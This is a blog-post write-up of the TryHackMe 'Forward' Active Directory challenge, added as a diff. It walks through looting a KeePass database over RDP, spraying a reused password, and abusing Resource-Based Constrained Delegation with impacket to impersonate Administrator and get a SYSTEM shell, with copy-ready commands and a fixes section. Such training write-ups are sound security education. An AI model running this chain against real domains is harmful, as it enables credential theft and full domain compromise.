@@ -1,0 +1,192 @@
+---
+title: 'Forward'
+description: 'Given a low-privilege AD account, loot a KeePass database over RDP, spray a reused help-desk password to reach an account with write access over the DC, then abuse Resource-Based Constrained Delegation to impersonate the Administrator.'
+date: 2026-06-20
+platform: tryhackme
+room: 'Forward'
+roomUrl: 'https://tryhackme.com/room/forwardchallenge'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'smb'
+  - 'rdp'
+  - 'windows'
+  - 'password-cracking'
+  - 'privesc'
+  - 'rbcd'
+vulnClasses:
+  - 'password reuse'
+  - 'resource-based constrained delegation'
+translation: done
+draft: false
+---
+
+_A walkthrough of the "Forward" Active Directory challenge from TryHackMe. We start with a single low-privilege domain account, loot a KeePass database off the Domain Controller over RDP, crack our way into a help-desk account whose password is reused across users, and finish by abusing Resource-Based Constrained Delegation (RBCD) to mint a Kerberos ticket as the Administrator._
+
+> Forward is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. The flag, the provided starter password, and every credential recovered on the box are shown as `<redacted>` — they are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Authenticate to a Windows DC (`DC01.ctf.local`, domain `ctf.local`) with the provided account `j.smith` → BloodHound shows `j.smith` can RDP in and that `r.williams` holds `AddAllowedToAct` over the DC → RDP in and loot `Database.kdbx` from `j.smith`'s Documents → open it in KeePass to recover `t.jones`'s password → **spray that same password** across the domain and it also unlocks `r.williams` (password reuse) → `r.williams` can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on `DC01`, so configure **RBCD** and S4U-impersonate `Administrator` → `psexec` with the forged ticket for a SYSTEM shell on the DC.
+
+Low-priv user → Domain Admin, driven entirely by one looted database and one reused password.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+An `nmap` service scan paints an unmistakable Active Directory Domain Controller:
+
+```text
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: ctf.local)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Global Catalog
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+```
+
+Kerberos (88/464), LDAP (389/636/3268) and DNS (53) confirm the host is the DC for `ctf.local`; the RDP certificate names it `DC01.ctf.local` (Windows Server 2019). SMB message signing is enabled and required. Map the name locally so Kerberos tooling resolves it:
+
+```text
+echo "$IP  DC01.ctf.local ctf.local DC01" | sudo tee -a /etc/hosts
+```
+
+The room hands us one starter credential, `j.smith:<redacted>`.
+
+### **The vulnerability**
+
+Forward isn't a single CVE — it's a chain of everyday Active Directory misconfigurations: a privileged credential left in a KeePass file on the DC, a help-desk password reused across accounts, and a dangerous ACL that lets a non-admin user write the delegation attribute of the Domain Controller itself.
+
+<Callout type="insight">
+
+The keystone is **Resource-Based Constrained Delegation**. If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object, you can nominate _any_ account you control as being "trusted to delegate" to that computer — and then use the S4U2Self/S4U2Proxy Kerberos extensions to request a service ticket _as any user_, including a Domain Admin. The DC trusts the ticket because it trusts itself.
+
+</Callout>
+
+### **Step 1 — enumerate SMB and the domain**
+
+With the starter account we enumerate shares and collect a full BloodHound dataset:
+
+```text
+nxc smb $IP -u j.smith -p '<redacted>' --shares
+bloodhound-python --zip -c All -d ctf.local -u 'j.smith' -p '<redacted>' -dc DC01.ctf.local -ns $IP
+```
+
+The shares are unremarkable (only a readable, empty `Downloads`), but BloodHound is decisive. Two facts stand out:
+
+- `j.smith` is a member of **Remote Desktop Users** — we can RDP into `DC01`.
+- `r.williams` holds **`AddAllowedToAct`** (write over `msDS-AllowedToActOnBehalfOfOtherIdentity`) on the Domain Controller — the exact right needed for RBCD.
+
+We don't have `r.williams`'s password yet, so the RDP foothold comes first.
+
+### **Step 2 — RDP in and loot the KeePass database**
+
+```text
+xfreerdp3 /v:$IP /u:j.smith /p:'<redacted>' /d:ctf.local +clipboard /dynamic-resolution
+```
+
+Inside `j.smith`'s profile is a credential vault:
+
+```text
+C:\Users\j.smith\Documents\Database.kdbx
+```
+
+Re-launch RDP with a mapped drive so the file copies straight back to the attacker box:
+
+```text
+xfreerdp3 /v:$IP /u:j.smith /p:'<redacted>' /d:ctf.local +clipboard /drive:share,/tmp
+# then, inside the RDP session:
+copy C:\Users\j.smith\Documents\Database.kdbx \\tsclient\share\
+```
+
+The Kali `keepass2john` build refused the KDBX 4 format (`File version '40000' is currently not supported`), so the pragmatic move was to open the database directly in a KeePass client rather than fight version skew. Inside, we recover the credentials for **`t.jones`** (value redacted).
+
+### **Step 3 — password spray: one password, two accounts**
+
+`t.jones`'s recovered password authenticates over SMB. More interestingly, when we build a user list and spray that _same_ password across the domain, it unlocks a second account too:
+
+```text
+nxc smb DC01.ctf.local -u t.jones -p '<redacted>' --users   # harvest the user list
+nxc smb DC01.ctf.local -u users_list.txt -p '<redacted>' --continue-on-success
+# [+] ctf.local\t.jones:<redacted>
+# [+] ctf.local\r.williams:<redacted>
+```
+
+`r.williams` reuses the help-desk password — and `r.williams` is exactly the account BloodHound flagged with `AddAllowedToAct` over the DC.
+
+### **Step 4 — abuse RBCD to impersonate the Administrator**
+
+A normal domain user may create up to 10 machine accounts (`MachineAccountQuota`). We create one, point the DC's delegation attribute at it, and request a ticket as `Administrator`:
+
+```text
+# 1) create a computer account we control
+impacket-addcomputer ctf.local/r.williams:'<redacted>' \
+  -computer-name 'ATTACKMKY$' -computer-pass '123456' -dc-ip $IP
+
+# 2) write RBCD on DC01, trusting our machine account
+impacket-rbcd -action write -delegate-to 'DC01$' -delegate-from 'ATTACKMKY$' \
+  -dc-ip $IP -dc-host DC01.ctf.local ctf.local/r.williams:'<redacted>'
+
+# 3) S4U impersonate Administrator for a CIFS ticket on the DC
+impacket-getST -dc-ip $IP -spn cifs/DC01.ctf.local \
+  -impersonate Administrator ctf.local/ATTACKMKY$:'123456'
+```
+
+Load the ticket and connect — no password needed:
+
+```text
+export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
+impacket-psexec -k -no-pass DC01.ctf.local -dc-ip $IP
+# C:\Windows\system32>
+```
+
+We land a SYSTEM shell on the DC. The flag sits on the Administrator desktop:
+
+```text
+C:\Users\Administrator\Desktop> more flag.txt
+THM{<redacted>}
+```
+
+From here the whole domain is ours — `secretsdump` over the same Kerberos ticket dumps the SAM/NTDS secrets for persistence.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 \~8.8** (`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`). A single low-privilege domain account leads to full domain compromise: the looted KeePass vault and a reused help-desk password hand over `r.williams`, whose `AddAllowedToAct` right over the Domain Controller allows RBCD abuse and Kerberos impersonation of the Administrator. The end state is SYSTEM on the DC and the ability to dump every domain secret (NTDS.dit), i.e. persistent Domain Admin.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+- **Remove the dangerous ACL.** No ordinary user should hold `AddAllowedToAct` / write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a Domain Controller. Audit write rights on computer objects and tier your administration.
+- **Set** **`MachineAccountQuota`** **to 0.** Denying normal users the ability to create machine accounts removes the pivot that most RBCD attacks depend on.
+- **Stop storing privileged credentials in reachable KeePass files** on the DC, and **ban password reuse** across accounts — the spray only worked because the help-desk password was shared. Enforce unique passwords and tier sensitive accounts.
+- **Restrict RDP to the DC** to administrators only; `j.smith` had no business holding an interactive logon right on a Domain Controller.
+
+</Callout>
+
+### **Takeaways**
+
+- **BloodHound tells you where to point the exploit.** The `AddAllowedToAct` edge turned an unglamorous RDP foothold into a straight line to Domain Admin.
+- **RBCD is a write-primitive attack.** Control over one delegation attribute plus the ability to create a machine account is all it takes to impersonate anyone to that host.
+- **Password reuse collapses tiers.** One cracked help-desk password unlocked the exact account that owned the DC's delegation attribute.
+
+Forward is a tidy end-to-end AD chain: loot, reuse, delegate. Thanks for reading.
